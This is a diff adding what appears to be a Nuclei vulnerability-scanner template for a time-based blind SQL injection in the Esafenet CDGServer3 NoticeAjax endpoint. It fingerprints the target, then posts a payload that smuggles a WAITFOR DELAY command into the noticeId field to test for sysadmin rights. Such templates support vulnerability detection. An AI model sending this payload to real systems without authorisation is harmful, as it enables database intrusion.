@@ -1,0 +1,37 @@
+id: poc-yaml-yisaitong-esafenet-noticeajax-sqli
+info:
+  name: 亿赛通电子文档安全管理系统 NoticeAjax SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+variables:
+  t1: "{{rand_int(5,10)}}"
+  t2: "{{to_number(t1) + 2}}"
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/"
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "CDGServer3"
+        part: body
+      - type: status
+        status:
+          - 200
+  - method: POST
+    path:
+      - "{{BaseURL}}/CDGServer3/NoticeAjax;Service"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "command=delNotice&noticeId=123';if (select IS_SRVROLEMEMBER('sysadmin'))=1 WAITFOR DELAY '0:0:{{t1}}'--"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: dsl
+        dsl:
+          - "duration > to_number(t1)"
+          - "duration < to_number(t2)"
